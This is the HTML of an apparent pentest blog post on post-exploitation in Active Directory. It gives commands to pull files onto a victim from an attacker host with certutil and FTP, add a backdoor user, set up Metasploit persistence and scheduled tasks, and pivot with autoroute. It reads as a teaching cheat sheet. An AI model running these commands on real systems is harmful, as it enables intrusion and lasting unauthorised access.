<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="https://auti.dev/images/favicon/favicon.ico" />
<title>Compromising AD - Part 4: Post Exploitation | auti.dev   ≽^._.^≼ ∫</title>
<meta name="title" content="Compromising AD - Part 4: Post Exploitation" />
<meta name="description" content="Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. File-Transfers Certutil
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
python -m SimpleHTTPServer [port] Browser
Navigate directly to the file (%20 for spaces) FTP
On Attacker Machine
python -m pyftpdlib 21 On Victim Machine, Browse to
ftp 10.10.10.10 Linux
wget https://example.com/example.txt Maintaining-Access Add a user" />
<meta name="keywords" content="active-directory,cybersecurity,windows,red-teaming," />


<meta property="og:title" content="Compromising AD - Part 4: Post Exploitation" />
<meta property="og:description" content="Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. File-Transfers Certutil
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
python -m SimpleHTTPServer [port] Browser
Navigate directly to the file (%20 for spaces) FTP
On Attacker Machine
python -m pyftpdlib 21 On Victim Machine, Browse to
ftp 10.10.10.10 Linux
wget https://example.com/example.txt Maintaining-Access Add a user" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://auti.dev/compromising-ad-part-4-post-exploitation/" /><meta property="og:image" content="https://auti.dev/images/share.png"/><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2021-08-17T12:35:53+05:30" />
<meta property="article:modified_time" content="2021-08-17T12:35:53+05:30" /><meta property="og:site_name" content="auti.dev   ≽^._.^≼ ∫" />



<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://auti.dev/images/share.png"/>

<meta name="twitter:title" content="Compromising AD - Part 4: Post Exploitation"/>
<meta name="twitter:description" content="Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. File-Transfers Certutil
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
python -m SimpleHTTPServer [port] Browser
Navigate directly to the file (%20 for spaces) FTP
On Attacker Machine
python -m pyftpdlib 21 On Victim Machine, Browse to
ftp 10.10.10.10 Linux
wget https://example.com/example.txt Maintaining-Access Add a user"/>



<meta itemprop="name" content="Compromising AD - Part 4: Post Exploitation">
<meta itemprop="description" content="Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. File-Transfers Certutil
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
python -m SimpleHTTPServer [port] Browser
Navigate directly to the file (%20 for spaces) FTP
On Attacker Machine
python -m pyftpdlib 21 On Victim Machine, Browse to
ftp 10.10.10.10 Linux
wget https://example.com/example.txt Maintaining-Access Add a user"><meta itemprop="datePublished" content="2021-08-17T12:35:53+05:30" />
<meta itemprop="dateModified" content="2021-08-17T12:35:53+05:30" />
<meta itemprop="wordCount" content="258"><meta itemprop="image" content="https://auti.dev/images/share.png"/>
<meta itemprop="keywords" content="active-directory,cybersecurity,windows,red-teaming," />
<meta name="referrer" content="no-referrer-when-downgrade" />

  <style>
  body {
    font-family: 'Inter', sans-serif;
    margin: auto;
    padding: 10px;
    max-width: 720px;
    text-align: left;
    background-color: #fff;
    word-wrap: break-word;
    overflow-wrap: break-word;
    line-height: 1.5;
    color: #444;
  }

  h1,
  h2,
  h3,
  h4,
  h5,
  h6,
  strong,
  b {
    color: #222;
  }

  a {
    color: #3273dc;
     
  }

  .title {
    text-decoration: none;
    border: 0;
  }

  .title span {
    font-weight: 400;
  }

  nav a {
    margin-right: 10px;
  }

  textarea {
    width: 100%;
    font-size: 16px;
  }

  input {
    font-size: 16px;
  }

  content {
    line-height: 1.6;
  }

  table {
    width: 100%;
  }

  img {
    max-width: 100%;
  }

  code {
    padding: 2px 5px;
    background-color: #f2f2f2;
    font-family: 'Fira Code', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto Mono', 'Cascadia Code', Courier, monospace;
  }

  pre code {
    color: #222;
    display: block;
    padding: 20px;
    white-space: pre-wrap;
    font-size: 14px;
    overflow-x: auto;
  }

  div.highlight pre {
    background-color: initial;
    color: initial;
  }

  div.highlight code {
    background-color: unset;
    color: unset;
  }

  blockquote {
    border-left: 1px solid #999;
    color: #222;
    padding-left: 20px;
    font-style: italic;
  }

  footer {
    padding: 25px;
    text-align: center;
  }

  .helptext {
    color: #777;
    font-size: small;
  }

  .errorlist {
    color: #eba613;
    font-size: small;
  }

   
  ul.blog-posts {
    list-style-type: none;
    padding: unset;
  }

  ul.blog-posts li {
    display: flex;
  }

  ul.blog-posts li span {
    flex: 0 0 130px;
  }

  ul.blog-posts li a:visited {
    color: rgba(230, 52, 52, 0.75);
;
  }

   

</style>


<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
<style>

     
     
     
     
     
     

    body {
        font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }

    h1 {
        font-weight: 900;
    }

    h2 {
        font-weight: 800;
    }

    h3 {
        font-weight: 700;
    }

    h4 {
        font-weight: 600;
    }

    a {
        color: rgba(230, 52, 52, 0.75);
        text-decoration: none;
        position: relative;
        transition: width 0.5s ease;
    }

    a::before {
        content: '';
        position: absolute;
        bottom: -2px;
        left: 0;
        width: 0;
        height: 1px;
        background-color: rgb(230, 52, 52);
        transition: width 0.5s ease;
    }

    a:hover {
        color: rgba(230, 52, 52, 1);
        transition: width 0.5s ease;
    }
    a:hover::before {
        width: 100%;  
    }

    .title:hover::before {
        width: 0% !important;
    }

    .iframe-container {
        display: flex;
        align-items: center;
    }

</style></head>

<body>
  <header><a href="/" class="title">
  <h2>auti.dev   ≽^._.^≼ ∫</h2>
</a>
<nav><a href="/">Home</a>


<a href="/blog">Blog</a>


<a href="/talk">Talks</a>


<a href="/project">Projects</a>
</nav>
</header>
  <main>

<h1>Compromising AD - Part 4: Post Exploitation</h1>
<p>
  <i>
    <time datetime='2021-08-17' pubdate>
      17 Aug, 2021
    </time>
  </i>
</p>

<content>
  <h1 id="post-exploitation">Post Exploitation</h1>
<hr>
<ul>
<li><a href="#post-exploitation">Post Exploitation</a>
<ul>
<li><a href="#file-transfers">File-Transfers</a></li>
<li><a href="#maintaining-access">Maintaining-Access</a></li>
<li><a href="#pivoting">Pivoting</a>
<ul>
<li><a href="#setup-and-pivot">Setup and Pivot!</a></li>
</ul>
</li>
<li><a href="#cleanup">Cleanup</a>
<ul>
<li><a href="#make-the-systemnetwork-as-it-was-when-you-entered-it">Make the system/network as it was when you entered it.</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<br>
<h2 id="file-transfers">File-Transfers</h2>
<hr>
<ul>
<li>
<p>Certutil</p>
<pre><code>  certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
</code></pre>
</li>
<li>
<p>HTTP - Change to the directory you want to host</p>
<pre><code>  python -m SimpleHTTPServer [port]
</code></pre>
</li>
<li>
<p>Browser</p>
<pre><code>  Navigate directly to the file (%20 for spaces)
</code></pre>
</li>
<li>
<p>FTP</p>
<ul>
<li>
<p>On Attacker Machine</p>
<pre><code>  python -m pyftpdlib 21
</code></pre>
</li>
<li>
<p>On Victim Machine, Browse to</p>
<pre><code>  ftp 10.10.10.10
</code></pre>
</li>
</ul>
</li>
<li>
<p>Linux</p>
<pre><code>  wget https://example.com/example.txt
</code></pre>
</li>
</ul>
<br>
<h2 id="maintaining-access">Maintaining-Access</h2>
<hr>
<ul>
<li>
<p>Add a user</p>
<pre><code>  net user hacker password 123 /add
</code></pre>
</li>
<li>
<p>Persistence Scripts</p>
<pre><code>  run persistence -h 

  exploit/windows/local/persistence 

  exploit/windows/local/registry_persistence 
</code></pre>
</li>
<li>
<p>Scheduled Tasks</p>
<pre><code>  run scheduleme 

  run schtaskabuse 
</code></pre>
</li>
</ul>
<br>
<h2 id="pivoting">Pivoting</h2>
<hr>
<p>Suppose you&rsquo;re on <strong><code>192.168.x.x</code></strong> <strong>Network</strong> and so your Victim is.</p>
<p>But when you get a shell into machine, you try the following commands:</p>
<pre><code>printroute
ipconfig
</code></pre>
<p>And you notice that there is <strong>another network</strong> (say <strong><code>eth1</code> <code>10.10.10.x</code></strong>)</p>
<p>How do we <strong>get into the other network?</strong></p>
<p>We do something called as <strong>PIVOTING -&gt; -&gt;</strong></p>
<br>
<h3 id="setup-and-pivot">Setup and Pivot!</h3>
<p>Fire up <code>msfconsole</code> and <strong>Route</strong> to the other network</p>
<pre><code>run autoroute -s 10.10.10.0/24
</code></pre>
<p><strong>List</strong> all the routes</p>
<pre><code>run autoroute -p 
</code></pre>
<p><strong>Background</strong> that session</p>
<pre><code>background 
</code></pre>
<p><strong>Let&rsquo;s Pivot</strong> into that Machine (<code>10.10.10.x</code> Network)</p>
<pre><code>use scanner/portscan/tcp
</code></pre>
<p>Set the <strong>RHOST</strong> and an <strong>Open Port</strong> (Since we know it&rsquo;s <strong>AD</strong>, we can use <strong>445</strong>)</p>
<pre><code>set RHOSTS 10.10.10.2
set PORTS 445

run
</code></pre>
<p>You have <strong>successfully pivoted</strong> into that machine! (which you didn&rsquo;t even know about because of <strong>different network</strong>)</p>
<br>
<h2 id="cleanup">Cleanup</h2>
<hr>
<h3 id="make-the-systemnetwork-as-it-was-when-you-entered-it">Make the system/network as it was when you entered it.</h3>
<ul>
<li>
<p>Remove <strong>executables</strong>, <strong>scripts</strong>, and <strong>added files.</strong></p>
</li>
<li>
<p>Remove <strong>malware</strong>, <strong>rootkits</strong>, and <strong>added user accounts.</strong></p>
</li>
<li>
<p>Set settings back to <strong>original configurations.</strong></p>
</li>
</ul>
<br>
<p><em><strong>:) Nice Work, Good Luck on Pentests!</strong></em></p>

</content>
<p>
  
  <a href="https://auti.dev/blog/active-directory/">#active-directory</a>
  
  <a href="https://auti.dev/blog/cybersecurity/">#cybersecurity</a>
  
  <a href="https://auti.dev/blog/windows/">#windows</a>
  
  <a href="https://auti.dev/blog/red-teaming/">#red-teaming</a>
  
</p>

  </main>
  <footer>
</footer>

    
</body>

</html>
